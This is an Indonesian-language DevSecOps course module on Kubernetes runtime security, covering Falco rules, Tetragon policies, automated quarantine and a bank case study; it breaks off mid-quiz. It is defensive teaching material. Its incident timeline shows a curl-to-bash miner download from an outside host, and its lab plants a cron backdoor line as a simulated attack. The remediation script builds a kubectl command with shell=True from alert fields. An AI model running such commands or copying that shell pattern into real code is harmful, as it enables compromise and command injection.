# Kurikulum DevSecOps Enterprise: BAB-08 Kubernetes Runtime Security
## Modul 02: Deep Dive, Implementasi Lanjutan & Arsitektur Produksi

---

### 1. Learning Objectives
Setelah menyelesaikan modul ini, peserta diharapkan mampu:
- **Menganalisis dan Memilih Mekanisme Instrumentasi Kernel**: Mengevaluasi trade-off arsitektural antara Linux Kernel Module (LKM) tradisional, eBPF (*extended Berkeley Packet Filter*), dan Linux Security Modules (LSM) untuk observabilitas dan proteksi runtime container.
- **Mendesain Arsitektur Runtime Security Skala Enterprise**: Mengonfigurasi dan mengoperasikan Falco dan Cilium Tetragon pada kluster Kubernetes multi-tenant berbeban tinggi.
- **Mengembangkan Aturan Deteksi & Penegakan Kebijakan Kustom**: Menulis aturan deteksi Falco (*custom rules*) serta *TracingPolicies* Tetragon berbasis eBPF untuk deteksi *privilege escalation*, manipulasi *namespaces*, *reverse shell*, dan akses file sensitif secara deterministik.
- **Mengimplementasikan Automated Incident Response (SOAR di Tingkat Node/Kluster)**: Membangun *closed-loop remediation pipeline* yang secara otomatis mengisolasi, mencabut kredensial, atau membunuh (*SIGKILL*) container yang terkompromi tanpa mengganggu stabilitas kluster.
- **Mengonfigurasi Seccomp, AppArmor, dan Linux Capabilities**: Menerapkan profil *defense-in-depth* tingkat syscall dan LSM menggunakan Security Profiles Operator (SPO) secara deklaratif.

---

### 2. Prerequisites
Sebelum mempelajari modul ini, peserta wajib memahami:
- Arsitektur internal Kubernetes: Kubelet, Container Runtime Interface (CRI/containerd), CNI, dan etcd.
- Fundamental Linux Kernel: System calls (`execve`, `fork`, `clone`, `ptrace`, `setns`), Linux Namespaces (`pid`, `net`, `mnt`, `ipc`, `uts`, `user`), Control Groups (cgroups v2).
- Konsep dasar DevSecOps Modul 01: Image scanning, static manifest auditing, Admission Controllers (OPA Gatekeeper/Kyverno).
- Kemampuan dasar CLI: `kubectl`, `helm`, `bpftool`, `strace`, dan dasar-dasar sintaksis YAML/Go template.

---

### 3. Concept & Internal Architecture

Keamanan runtime Kubernetes berfokus pada apa yang sebenarnya terjadi saat container dieksekusi di dalam host Linux kernel. Meskipun container terisolasi oleh namespaces dan dibatasi oleh cgroups, mereka tetap **berbagi satu kernel yang sama dengan host**. Runtime security modern beroperasi pada titik temu antara system calls dan kernel context.

```
+-----------------------------------------------------------------------------------+
|                                  USER SPACE                                       |
|                                                                                   |
|  +---------------------------+  +----------------------------------------------+  |
|  |       App Container       |  | Falco Daemon / Tetragon Agent (DaemonSet)    |  |
|  |  +---------------------+  |  |  +---------------------+  +---------------+  |  |
|  |  | Binary (e.g., sh)   |  |  |  | Userspace RingBuffer|  | Rule Engine   |  |  |
|  |  +----------+----------+  |  |  | Reader              |  | (YAML Rules)  |  |  |
|  +-------------|-------------+  +--+----------^----------+--+-------+-------+--+  |
|                |                              |                     |             |
|                | System Call                  | Perf/Ring Buffer    | Action      |
|                | (e.g., execve)               | Event Stream        | (Kill/Alert)|
+----------------|------------------------------|---------------------|-------------+
|                v                              |                     |             |
|  +-------------+------------------------------+---------------------v----------+  |
|  | Linux Kernel System Call Table (sys_enter_execve / sys_exit_execve)         |  |
|  +------------------------------------+----------------------------------------+  |
|  | eBPF Subsystem / Kernel Probe Point:                                        |  |
|  |  - Tracepoints (raw_syscalls/sys_enter)                                     |  |
|  |  - Kprobes / Kretprobes (e.g., commit_creds, do_filp_open)                   |  |
|  |  - LSM Hooks (e.g., bprm_check_security, file_permission)                   |  |
|  |  +-----------------------------------------------------------------------+  |  |
|  |  | BPF Bytecode Program (JIT-compiled, verified via BPF Verifier)       |  |  |
|  |  |  - Filter by cgroup/namespace                                        |  |  |
|  |  |  - Extract arguments & container metadata                            |  |  |
|  |  |  - In-kernel enforcement: bpf_send_signal(SIGKILL) (Tetragon)         |  |  |
|  |  +-----------------------------------+-----------------------------------+  |  |
|  |                                      |                                      |  |
|  |                                      v                                      |  |
|  |                           BPF Maps / BPF Ring Buffer                        |  |
|  +-----------------------------------------------------------------------------+  |
|                                  KERNEL SPACE                                     |
+-----------------------------------------------------------------------------------+
```

#### Komponen Kunci Arsitektur eBPF Runtime Security:
1. **LSM Hooks (Linux Security Module)**: Titik instrumentasi pada kernel (seperti AppArmor, SELinux, BPF-LSM) yang dieksekusi tepat sebelum kernel memberikan izin akses atas suatu objek (file, socket, process memory).
2. **BPF Ring Buffer**: Struktur data multi-producer single-consumer berkinerja tinggi berbasis memory-mapped (mmap) yang menggantikan `BPF_MAP_TYPE_PERF_EVENT_ARRAY`, memungkinkan transfer data peristiwa kernel ke *userspace agent* tanpa overhead *per-CPU buffer fragmentation* dan *lock contention*.
3. **Container Context Enrichment**: eBPF bytecode membaca *task_struct* dari proses yang memanggil syscall, mengekstrak Cgroup ID, dan mengaitkannya dengan container ID, pod name, dan namespace melalui pembacaan data runtime (misal: containerd socket) di tingkat userspace.
4. **Kernel Verifier**: Mekanisme pengamanan internal Linux yang memastikan kode BPF yang dimuat tidak akan mengalami infinite loop, tidak mereferensikan pointer liar (*out-of-bounds*), dan aman secara memori sebelum dijalankan via JIT compiler.

---

### 4. Why & What

| Dimensi | Mengapa Diperlukan? (Why) | Apa yang Diterapkan? (What) |
| :--- | :--- | :--- |
| **Bypass Admission Control** | Zero-day exploit (e.g., Log4Shell, Spring4Shell) terjadi secara dinamis di memori saat aplikasi sedang aktif; admission controller statis tidak dapat mendeteksinya. | Monitoring syscall kernel secara real-time via eBPF untuk mendeteksi *spawning shell*, *dynamic binary compilation*, atau *file execution* dari `/tmp`. |
| **Container Escape Defense** | Misconfiguration seperti hostPath mounting berbahaya, privileged flags, atau kerentanan kernel (e.g., Dirty COW, Dirty Pipe) memungkinkan penetrasi ke host. | Deteksi anomali pada pemanggilan namespace switching (`setns`, `unshare`) dan akses LSM yang tidak sah pada `/proc` atau `/sys`. |
| **Zero-Impact Enforcement** | Solusi agent lama berbasis ptrace atau LD_PRELOAD menyebabkan latensi ekstrim dan mudah dilewati/di-bypass oleh penyerang. | In-kernel enforcement berbasis LSM BPF yang mampu melakukan terminate (`SIGKILL`) di level kernel sebelum syscall diselesaikan. |

---

### 5. How: Workflow Operasional Runtime Detection & Mitigation

```
+----------------+      1. Syscall Invoked       +------------------------+
| App Process    | ----------------------------> | sys_enter_execve       |
+----------------+                               +-----------+------------+
                                                             |
                                                             | 2. Hook Executed
                                                             v
                                                 +------------------------+
                                                 | eBPF Program (Kernel)  |
                                                 | - Evaluate Cgroup ID   |
                                                 | - Validate Allowed Bin |
                                                 +-----------+------------+
                                                             |
                                      +----------------------+----------------------+
                                      | Matched Bad Event                           | Synchronous LSM Block /
                                      v                                             v Kill (Tetragon)
                         +--------------------------+                         +-------------------+
                         | Ring Buffer Enqueue      |                         | bpf_send_signal() |
                         +------------+-------------+                         | Terminate Process |
                                      |                                       +-------------------+
                                      | 3. Userspace Consume
                                      v
                         +--------------------------+
                         | Runtime Engine (Falco)   |
                         | - Rule Context Match     |
                         | - Enrichment (K8s Pod)   |
                         +------------+-------------+
                                      |
                                      | 4. Dispatch Alert (JSON / gRPC)
                                      v
                         +--------------------------+
                         | Automated Remediation    |
                         | (SOAR / K8s Operator)    |
                         +------------+-------------+
                                      |
                       +--------------+---------------+
                       |                              |
                       v                              v
            +--------------------+        +-----------------------+
            | Network Isolation  |        | Pod Deletion / Evict  |
            | (NetworkPolicy Deny|        | (CRI Eviction)        |
            +--------------------+        +-----------------------+
```

1. **Intersepsi Syscall**: Aplikasi di dalam Pod memicu syscall berbahaya (misal: `execve` mengeksekusi `/bin/sh` di dalam container produksi berbasis Go yang seharusnya *scratch/distroless*).
2. **Kernel-Level Evaluation**: Hook eBPF yang terpasang pada `sys_enter_execve` atau LSM hook `bprm_check_security` mencegat request. Tetragon dapat langsung mengeksekusi penindakan synchronous (`SIGKILL`), sedangkan Falco meneruskan event payload ke BPF ring buffer.
3. **Userspace Enrichment**: DaemonSet (Falco/Tetragon) membaca event dari BPF ring buffer, melakukan parsing argumen, dan mengintegrasikannya dengan metadata dari Kubelet API (Pod Name, Namespace, Labels).
4. **Alert & Event Routing**: Event yang cocok dengan definisi ancaman dikirimkan melalui channel transmisi latensi rendah (gRPC stream atau HTTPS webhook) ke remediation engine.
5. **Dynamic Remediation**: Sistem automasi (misalnya Falco Sidekick yang mengeksekusi Kubernetes API client) langsung mengisolasi pod menggunakan `NetworkPolicy` darurat, membuat *label quarantine*, atau mematikan pod untuk forensik.

---

### 6. Analogy & Diagram ASCII

#### Analogi Dunia Nyata:
Bayangkan sebuah bandara internasional dengan pengamanan ketat:
- **Image Scanning & Static Analysis** adalah pemeriksaan berkas visa dan paspor di kedutaan sebelum tiket diterbitkan (Preventif Statis).
- **Admission Controller (Gatekeeper/Kyverno)** adalah petugas imigrasi di gerbang bandara yang menolak penumpang dengan visa kedaluwarsa masuk ke terminal (Preventif Deploy-time).
- **Runtime Security (Falco/Tetragon)** adalah kamera pengawas berkecepatan tinggi berfitur AI (eBPF) yang memonitor gerak-gerik penumpang di dalam area steril. Jika seseorang tiba-tiba mengeluarkan senjata di ruang tunggu, pengawas keamanan langsung menembakkan bius ditempat (*Tetragon in-kernel SIGKILL*) atau mengirimkan sinyal ke petugas patroli terdekat untuk mengepung ruangan (*Falco automated network isolation*).

```
[ HOST ARCHITECTURE / BPF TRACEPOINTS MAP ]

[ KERNEL SPACE ]
 +-----------------------------------------------------------------------+
 | Raw Syscalls (sys_enter, sys_exit)                                    |
 |    |                                                                  |
 |    +--> [Tracepoint: raw_syscalls:sys_enter]                          |
 |    |          |                                                       |
 |    |          v                                                       |
 |    |    +---------------+        Maps: Pod/PID Cache                  |
 |    |    | ebpf_probe.o  | <========================+                  |
 |    |    +-------+-------+                          |                  |
 |    |            |                                  |                  |
 |    |            v                                  |                  |
 |    |    +---------------+                          |                  |
 |    |    | Perf / Ring   |                          |                  |
 |    |    | Buffer        |                          |                  |
 |    |    +-------+-------+                          |                  |
 +-----------------|----------------------------------|------------------+
                   |                                  |
 [ USER SPACE ]    v                                  |
 +----------------------------------------------------|------------------+
 |           +-----------+                            |                  |
 |           | Falco/    |                            |                  |
 |           | Tetragon  | ---------------------------+                  |
 |           | Engine    | (Sync with /var/run/containerd/containerd.sock)   |
 |           +-----+-----+                                               |
 |                 |                                                     |
 |                 +--> Output: STDOUT / File / Falcosidekick            |
 |                                    |                                  |
 |                                    v                                  |
 |                           [SIEM / SOAR / Slack]                       |
 +-----------------------------------------------------------------------+
```

---

### 7. Simple & Practical Examples

#### Contoh 1: Custom Falco Rule (Deteksi Eksekusi Shell di Pod Produksi)
Simpan konfigurasi berikut pada ConfigMap Falco (`/etc/falco/rules.d/custom-rules.yaml`):

```yaml
- list: production_namespaces
  items: [prod-payment, prod-auth, prod-core]

- list: allowed_binaries_in_prod
  items: [/app/server, /usr/bin/pause]

- macro: spawned_process
  condition: (evt.type = execve and evt.dir = <)

- macro: container_context
  condition: (container.id != host and container.name != "POD")

- rule: Unauthorized Shell Execution in Production Container
  desc: Detect interactive shell spawned inside critical production namespaces
  condition: >
    spawned_process and 
    container_context and 
    k8s.ns.name in (production_namespaces) and 
    proc.name in (bash, sh, zsh, ksh, dash) and 
    not proc.pname in (allowed_binaries_in_prod)
  output: >
    CRITICAL: Interactive Shell Spawned in Production!
    (user=%user.name user_loginuid=%user.loginuid pod=%k8s.pod.name 
    namespace=%k8s.ns.name container=%container.name process=%proc.name 
    parent=%proc.pname cmdline=%proc.cmdline path=%proc.sname image=%container.image.repository)
  priority: CRITICAL
  tags: [mitre_execution, pci_dss, production]
```

#### Contoh 2: Tetragon TracingPolicy (Penegakan In-Kernel SIGKILL untuk Container Breakout via Modifikasi Sysfs)
Kebijakan keamanan deklaratif Tetragon untuk memblokir modifikasi atribut kernel secara *real-time*:

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: block-sysfs-manipulation
  namespace: kube-system
spec:
  kprobes:
    - call: "sys_openat"
      syscall: true
      args:
        - index: 0
          type: "int" # dirfd
        - index: 1
          type: "string" # filename
        - index: 2
          type: "int" # flags
      selectors:
        - matchArgs:
            - index: 1
              operator: "Prefix"
              values:
                - "/sys/kernel/security"
                - "/sys/fs/cgroup"
                - "/proc/sysrq-trigger"
          matchNamespaces:
            - operator: "NotIn"
              values:
                - "kube-system"
          matchActions:
            - action: Sigkill
            - action: NotifyEnforcer
```

---

### 8. Real-World Case Study (Enterprise Scale)

#### Konteks Sistem
* **Industri**: Tier-1 Digital Banking Platform.
* **Skala**: 12 Kluster Kubernetes (EKS), 450 Worker Nodes, 8.500+ Pods aktif.
* **Kebutuhan Regulasi**: PCI-DSS v4.0 Requirement 10 & 11, Regulasi Bank Sentral (OJK POJK-11/2022).
* **Vektor Insiden**: Penyerang mengeksploitasi kerentanan *Remote Code Execution* (RCE) deserialisasi Java pada layanan Core Payment Gateway, kemudian mengunduh crypto-miner dan berupaya mengakses endpoint link-local cloud metadata service (169.254.169.254) untuk mencuri AWS IAM Instance Profile token.

#### Arsitektur Solusi & Alur Penanganan Insiden
```
+----------------------------------------------------------------------------------------------------+
| 1. Incident Timeline: Zero-Day Exploit                                                             |
|                                                                                                    |
| [Attacker]                                                                                         |
|      |                                                                                             |
|      v (POST /api/v1/payment [RCE Deserialization Payload])                                         |
| [Pod: payment-processor-7cf9-x8j2l]                                                                |
|      |                                                                                             |
|      +---> 1. Process Spawning: /bin/bash -c "curl http://185.x.x.x/xmr.sh | bash"                 |
|      |        |                                                                                    |
|      |        v [Kernel eBPF Hook]                                                                 |
|      |        - Falco Rule Triggered: "Unauthorized Shell Execution"                               |
|      |        - Output JSON dispatched to Falcosidekick in 12ms                                    |
|      |                                                                                             |
|      +---> 2. In-Kernel Execution: Tetragon intercepts raw socket to 169.254.169.254               |
|      |        |                                                                                    |
|      |        v [Tetragon TracingPolicy (action: Sigkill)]                                         |
|      |        - Kernel halts thread execution instantly (0ms latency, zero-packet egress)          |
|      |                                                                                             |
| [Falcosidekick]                                                                                    |
|      |                                                                                             |
|      v (Dispatch Webhook to Kyverno / K8s Auto-Isolator)                                           |
| [Auto-Isolator Operator]                                                                           |
|      |                                                                                             |
|      v Apply Emergency Isolation Mechanism:                                                        |
|      1. Patch Pod Labels: app=quarantine, access=blocked                                           |
|      2. Enforce Quarantine NetworkPolicy (Deny All Ingress/Egress)                                  |
|      3. Create Pod Memory Dump snapshot via CRI-O/containerd checkpoint API for forensics          |
|      4. Alert dispatched to SIEM (Splunk) & PagerDuty SecOps Team                                  |
+----------------------------------------------------------------------------------------------------+
```

#### Hasil Terukur (Metrics & Business Value)
- **Mean Time to Detect (MTTD)**: Turun dari rata-rata industri 207 hari menjadi **< 150 milidetik**.
- **Mean Time to Remediate (MTTR)**: Penahanan otomatis (Quarantine + Process Kill) selesai dalam **1.8 detik**, mencegah pencurian kredensial AWS IAM sama sekali.
- **Overhead Produksi**: Pemanfaatan CPU oleh DaemonSet eBPF stabil pada **0.4 Core per Worker Node (m6i.4xlarge)** dengan penambahan latensi transaksi transfer bank **< 1.2%**.

---

### 9. Trade-offs: Analisis Strategis Runtime Defense

| Pendekatan / Driver | Keuntungan Utama | Trade-offs & Kekurangan | Pertimbangan Kritis di Skala Produksi |
| :--- | :--- | :--- | :--- |
| **Traditional Kernel Module (Falco Driver)** | Kompatibilitas tinggi dengan kernel lawas (< Linux 4.14). | Risiko *Kernel Panic*; modifikasi kernel crash dapat meruntuhkan seluruh worker node dan ratusan pod di dalamnya. | **Hindari di lingkungan cloud enterprise modern.** Gunakan hanya jika terpaksa menggunakan distro OS legacy. |
| **Modern eBPF (CO-RE - Compile Once, Run Everywhere)** | Eksekusi aman dalam *sandboxed virtual machine* di kernel; tidak ada risiko crash kernel; performa sangat tinggi. | Bergantung pada `BTF` (*BPF Type Format*) di kernel host (Linux 5.4+); verifier membatasi kompleksitas komputasi instruksi BPF. | **Standar industri.** Pastikan node base-image (misal: Bottlerocket, Ubuntu 22.04+, RHEL 8.4+) mendukung BTF. |
| **LSM BPF (Tetragon In-Kernel Enforcement)** | Mampu melakukan mitigasi aktif (*kill/block*) secara sinkron di kernel sebelum tindakan IO berbahaya tereksekusi. | Kesalahan logika pada TracingPolicy dapat mematikan (*SIGKILL*) proses bisnis penting secara keliru tanpa *graceful shutdown*. | Lakukan proses *staged rollout*: Audit mode (notify-only) selama minimal 14 hari sebelum menerapkan mode `Sigkill`. |
| **Userspace Auditing (Auditd / Audit Beat)** | Tidak membutuhkan modul kernel pihak ketiga; sangat matang dan teruji selama puluhan tahun. | Terjadi *performance collapse* akibat context-switching berlebih pada frekuensi syscall tinggi; rentan *event-dropping* under load. | Tidak direkomendasikan untuk cluster microservices dengan throughput tinggi (e.g., > 10.000 RPS). |

---

### 10. Common Mistakes & Troubleshooting

#### 1. Masalah: BPF Verifier Error (`BPF program is too large` atau `invalid mem access`)
- **Penyebab**: Kode BPF kustom atau versi library eBPF yang digunakan mencoba membaca pointer yang tidak tervalidasi `NULL`, atau kompleksitas percabangan (*branching complexity*) melampaui batas instruksi verifier kernel (misal: 1 juta instruksi di kernel modern).
- **Troubleshooting**:
  ```bash
  # Cek status log verifier eBPF menggunakan bpftool
  sudo bpftool prog show
  sudo bpftool prog dump xlated id <PROG_ID>
  
  # Cek error kernel ring buffer
  sudo dmesg -T | grep -i -E "bpf|verifier"
  ```
- **Solusi**: Gunakan probe *Bounded Loops*, optimalkan struct alignment, dan pastikan setiap dereferensi pointer melewati fungsi pembantu `bpf_probe_read_kernel()`.

#### 2. Masalah: Falco Pod Mengalami High CPU & Event Dropping under Stress Load
- **Penyebab**: Ukuran BPF Ring Buffer tidak mencukupi untuk menampung volume syscall `openat`/`read`/`write` dari container I/O-heavy (seperti Database Pod atau Kafka), mengakibatkan *dropped events count* meningkat drastis.
- **Troubleshooting**:
  ```bash
  # Periksa statistik internal Falco
  kubectl logs -n falco -l app.kubernetes.io/name=falco | grep -i "drop"
  ```
  *Output khas*: `{"events_detected": 100420, "drops": 45100, "drop_pct": 31.0}`
- **Solusi**:
  1. Tingkatkan ukuran buffer di Helm `values.yaml`:
     ```yaml
     falco:
       ebpf:
         bufSizePreset: 8 # Alokasikan 8MB per CPU core
     ```
  2. Tambahkan rule macro exclusion untuk mengabaikan folder/syscall bervolume tinggi yang terverifikasi aman:
     ```yaml
     - macro: benign_io_paths
       condition: (fd.name startswith /var/log or fd.name startswith /tmp/kafka)
     ```

#### 3. Masalah: Container Gagal Berjalan Karena Seccomp Profile Terlalu Restriktif
- **Penyebab**: Menerapkan seccomp profile `RuntimeDefault` atau kustom yang memblokir syscall fundamental baru (misal: `clone3` pada glibc versi baru).
- **Troubleshooting**:
  ```bash
  # Cari syscall yang diblokir pada host audit log
  sudo ausearch -m SECCOMP -ts recent
  # Decode syscall number ke nama sistem
  ausyscall --dump <SYSCALL_NUMBER>
  ```
- **Solusi**: Audit pemanggilan syscall menggunakan `strace -c -f` pada lingkungan staging untuk membuat *allow-list* syscall yang presisi sebelum dipromosikan ke production.

---

### 11. Best Practices (Production Checklist)

- [ ] **Distribusi Node OS**: Gunakan Node OS minimalis yang mendukung Linux Kernel $\ge$ 5.15 dengan konfigurasi kernel `CONFIG_DEBUG_INFO_BTF=y` aktif secara *default*.
- [ ] **Driver Selection**: Konfigurasikan Falco secara ketat menggunakan `driver.kind=ebpf` dengan opsi Modern BPF Probe diaktifkan untuk menghilangkan kebutuhan pemasangan *kernel header* di node produksi.
- [ ] **LSM Enforcement**: Terapkan profil Seccomp `RuntimeDefault` sebagai baseline mandatory di seluruh cluster melalui Pod Security Standards (*Restricted Profile*).
- [ ] **Rule Lifecycle Management**: Terapkan *GitOps pipeline* terpisah untuk rules keamanan runtime. Gunakan pengujian otomatis menggunakan skrip simulasi exploit sebelum rule di-merge ke branch `main`.
- [ ] **Rate Limiting & Aggregation**: Pasang rate limiter pada *Falcosidekick* untuk mencegah *alert fatigue* atau *Denial of Service* pada sistem SIEM ketika terjadi loop eksploitasi masif.
- [ ] **Namespace Exclusions**: Jangan sekali-kali menonaktifkan deteksi untuk namespace sensitif (`kube-system`, `cert-manager`). Jika ada noise, persempit rule pada atribut `proc.name` atau `k8s.pod.name`, bukan mengecualikan seluruh namespace.
- [ ] **Health Check & Self-Protection**: Konfigurasikan alerts Prometheus untuk memantau metrik Falco `falco_evts_drop_total` dan `falco_buffer_usage_ratio`. Pastikan agen runtime dilindungi oleh `PriorityClass: system-node-critical`.

---

### 12. Hands-on Practice: Membangun Production-Grade Runtime Defense

Simpan seluruh artefak praktikum ini di direktori: `hands-on/m02/`.

#### Langkah 1: Persiapan Environment & Instalasi Falco via Helm (eBPF Engine)
Buat file `hands-on/m02/falco-values.yaml`:

```yaml
driver:
  kind: modern_ebpf

falco:
  priority: notice
  buffered_outputs: true
  json_output: true
  json_include_output_property: true
  json_include_tags_property: true

collectors:
  containerd:
    enabled: true
    socket: /run/containerd/containerd.sock

falcosidekick:
  enabled: true
  webhooks:
    - name: "remediation-webhook"
      url: "http://runtime-remediator.secops.svc.cluster.local:8080/alert"
      minimumpriority: "critical"
```

Eksekusi deployment Falco:
```bash
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm repo update

kubectl create namespace falco
helm install falco falcosecurity/falco \
  --namespace falco \
  --values hands-on/m02/falco-values.yaml
```

#### Langkah 2: Deploy Custom Falco Rule untuk Deteksi Manipulasi Crontab & System Binaries
Buat file `hands-on/m02/custom-rules-cm.yaml`:

```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: falco-custom-rules
  namespace: falco
data:
  custom-rules.yaml: |
    - rule: Unauthorized Scheduled Task Modification
      desc: Detect modification of crontab or cron.d directory inside containers
      condition: >
        open_write and container and
        (fd.name startswith /etc/cron or fd.name startswith /var/spool/cron)
      output: >
        CRITICAL: Container persistence mechanism detected! File modified under cron directory
        (user=%user.name pod=%k8s.pod.name container=%container.name file=%fd.name action=%evt.type)
      priority: CRITICAL
      tags: [persistence, mitre_privilege_escalation]
```
Terapkan dan restart Falco:
```bash
kubectl apply -f hands-on/m02/custom-rules-cm.yaml
kubectl rollout restart daemonset falco -n falco
```

#### Langkah 3: Deploy Automated Remediation Webhook Server
Buat file deployment service remediation `hands-on/m02/remediator.yaml`:

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: runtime-remediator
  namespace: secops
spec:
  replicas: 1
  selector:
    matchLabels:
      app: runtime-remediator
  template:
    metadata:
      labels:
        app: runtime-remediator
    spec:
      serviceAccountName: remediator-sa
      containers:
        - name: remediator
          image: python:3.11-alpine
          command: ["python", "-c"]
          args:
            - |
              from http.server import HTTPServer, BaseHTTPRequestHandler
              import json, subprocess

              class Handler(BaseHTTPRequestHandler):
                  def do_POST(self):
                      content_len = int(self.headers.get('Content-Length', 0))
                      body = json.loads(self.rfile.read(content_len))
                      output_fields = body.get('output_fields', {})
                      pod = output_fields.get('k8s.pod.name')
                      ns = output_fields.get('k8s.ns.name')
                      
                      if pod and ns:
                          print(f"ISOLATING COMPROMISED POD: {pod} in {ns}")
                          # Apply isolation label to pod
                          cmd = f"kubectl label pod {pod} -n {ns} security.isolation=quarantined --overwrite"
                          subprocess.run(cmd, shell=True)
                      
                      self.send_response(200)
                      self.end_headers()
                      self.wfile.write(b"OK")

              server = HTTPServer(('0.0.0.0', 8080), Handler)
              print("Remediation daemon listening on 8080...")
              server.serve_forever()
---
apiVersion: v1
kind: Service
metadata:
  name: runtime-remediator
  namespace: secops
spec:
  selector:
    app: runtime-remediator
  ports:
    - port: 8080
      targetPort: 8080
```
Terapkan RBAC dan remediator:
```bash
kubectl create namespace secops
kubectl create serviceaccount remediator-sa -n secops
kubectl create clusterrole remediator-role --verb=get,list,patch,update --resource=pods
kubectl create clusterrolebinding remediator-binding --clusterrole=remediator-role --serviceaccount=secops:remediator-sa
kubectl apply -f hands-on/m02/remediator.yaml
```

#### Langkah 4: Terapkan Emergency Quarantine NetworkPolicy
Buat file `hands-on/m02/quarantine-policy.yaml`:

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: global-pod-quarantine
  namespace: default
spec:
  podSelector:
    matchLabels:
      security.isolation: quarantined
  policyTypes:
    - Ingress
    - Egress
  ingress: [] # Block all ingress
  egress: []  # Block all egress
```
Deploy policy:
```bash
kubectl apply -f hands-on/m02/quarantine-policy.yaml
```

#### Langkah 5: Eksekusi Serangan Uji Coba & Verifikasi Respons
Deploy target pod yang rentan:
```bash
kubectl run victim-app --image=alpine -n default -- sleep 3600
```
Lakukan simulasi payload serangan di dalam container:
```bash
kubectl exec -it victim-app -n default -- /bin/sh -c "echo '* * * * * root /tmp/malicious.sh' >> /etc/cron.d/backdoor"
```
Verifikasi hasil otomatisasi:
```bash
# 1. Cek logs Falco
kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=10

# 2. Cek label pada Pod (Harus memiliki label security.isolation=quarantined)
kubectl get pod victim-app -n default --show-labels

# 3. Uji egress pod (Harus timeout karena terisolasi oleh NetworkPolicy)
kubectl exec -it victim-app -n default -- ping -c 2 8.8.8.8
```

---

### 13. Exercises

#### Level Easy
Buat Falco macro dan rule sederhana untuk mendeteksi pembacaan file private key TLS/SSH (`.pem`, `.key`, `id_rsa`) oleh proses selain web server (`nginx`, `envoy`). Uji aturan tersebut dengan perintah `cat /etc/ssl/certs/cert.pem` dari container uji.

#### Level Medium
Konfigurasikan profile Seccomp custom menggunakan JSON untuk container database PostgreSQL. Profil harus memblokir syscall ptrace (`ptrace`), manipulasi namespace (`setns`), dan network sniffing (`raw_sockets`), tetapi tetap mengizinkan seluruh pemanggilan syscall normal database. Terapkan menggunakan `securityContext.seccompProfile` pada manifest Pod.

#### Level Hard
Buat TracingPolicy Cilium Tetragon yang mendeteksi upaya container breakout melalui namespace pivoting. Spesifikasi harus menangkap pemanggilan syscall `setns` atau `unshare` yang mencoba menyematkan namespace host (`mnt` atau `pid`) dari namespace container non-root, memblokirnya secara langsung via tindakan `Sigkill`, dan mencatat variabel argumen ke syslog Tetragon.

---

### 14. Challenge

**Skenario**: Anda adalah Principal Security Engineer pada sebuah bank digital. Kluster Kubernetes memproses transaksi kartu kredit berlatensi ultra-rendah (<10ms P99).
- Tim compliance mewajibkan: *Setiap proses tak terdaftar yang melakukan koneksi outbound (egress) ke internet publik harus diputus koneksinya dan dimatikan secara instan tanpa toleransi downtime pada thread proses lain dalam Pod yang sama.*
- **Batasan**:
  1. Anda **DILARANG** me-restart Pod secara keseluruhan karena waktu inisialisasi state aplikasi memakan waktu 8 menit.
  2. Solusi tidak boleh menggunakan *polling* atau intervensi userspace yang membutuhkan waktu > 5 milidetik.
  3. Latensi normal aplikasi tidak boleh terdegradasi lebih dari 0.5 milidetik per request.
- **Deliverable**:
  - Tulis dokumen arsitektur dan manifest lengkap (eBPF TracingPolicy / BPF-LSM kustom) yang mampu melakukan terminate thread berbahaya via kernel signal secara deterministik, sembari menjaga main application loop tetap melayani transaksi.

---

### 15. Quiz Evaluasi Pemahaman

#### Bagian 1: Basic (5 Pertanyaan)
1. Apa keunggulan fundamental penggunaan eBPF dibanding Linux Kernel Module (LKM) tradisional untuk monitoring keamanan container?
2. Mengapa memeriksa flag `privileged: true` pada pod manifest saja tidak cukup untuk menjamin integritas runtime container?
3. Sebutkan nama syscall Linux yang digunakan untuk mengeksekusi binary baru dan menjadi target utama pengawasan Falco dan Tetragon.
4. Apa fungsi dari BPF Ring Buffer dalam konteks arsitektur agent runtime security?
5. Apakah seccomp dapat digunakan untuk membatasi akses proses ke path file tertentu (misal: `/etc/shadow`)? Jelaskan alasannya.

#### Bagian 2: Intermediate (5 Pertanyaan)
6. Jelaskan perbedaan mendasar antara mekanisme deteksi Falco (default eBPF driver) dan in-kernel enforcement Cilium Tetragon.
7. Mengapa sebuah pod distroless (tanpa package manager dan shell) tetap membutuhkan runtime threat monitoring?
8. Bagaimana eBPF userspace daemon dapat memetakan sebuah kernel system call yang hanya memiliki informasi `PID` host ke entitas Kubernetes (Namespace, Pod Name, Container ID)?
9. Apa perbedaan operasional antara kprobe (`kprobe/sys_exec`) dan LSM hook (`lsm/bprm_check_security`) dalam konteks keamanan sistem?
10. Sebutkan konsekuensi keamanan jika flag `hostPID: true` diaktifkan pada pod manifest terkait runtime isolation.

#### Bagian 3: Skenario Kasus Produksi (3 Kasus Kompleks)

##### Kasus 1: Kernel Deadlock / High Softirq Drop
Sebuah kluster Kubernetes berkapasitas 80 node mengalami degradasi performa ekstrem setelah agen runtime security berbasis eBPF diaktifkan. Penggunaan CPU kernel (`%sys` dan `ksoftirqd`) melonjak hingga 90% pada worker node yang menjalankan workload caching memory-intensive (Redis). Ring buffer agen mencatatkan `dropped events` hingga 70%.
- **Pertanyaan**: Apa akar masalah arsitektural di tingkat kernel yang menyebabkan lonjakan `ksoftirqd` ini, dan langkah mitigasi konkret apa yang harus diambil tanpa mematikan agen keamanan?

##### Kasus 2: The Evasive Reverse Shell
Seorang red-teamer berhasil mengeksekusi reverse shell pada container Node.js tanpa memicu Falco rule standar yang mendeteksi `proc.name in (bash, sh)`. Penyerang menggunakan binary Python yang disalin ke path non-standar: `/dev/shm/.x/myshell` dan langsung memanggil system call `connect` dan duplikasi socket via fd mapping langsung di memori.
- **Pertanyaan**: Mengapa rule berbasis `proc.name` gagal mendeteksi serangan ini? Tuliskan perbaikan logika deteksi Falco atau Tetragon yang tahan terhadap teknik evasif tersebut (*signature-agnostic detection*).

##### Kasus 3: Falco Pod Resource Starvation under Cryptomining Attack
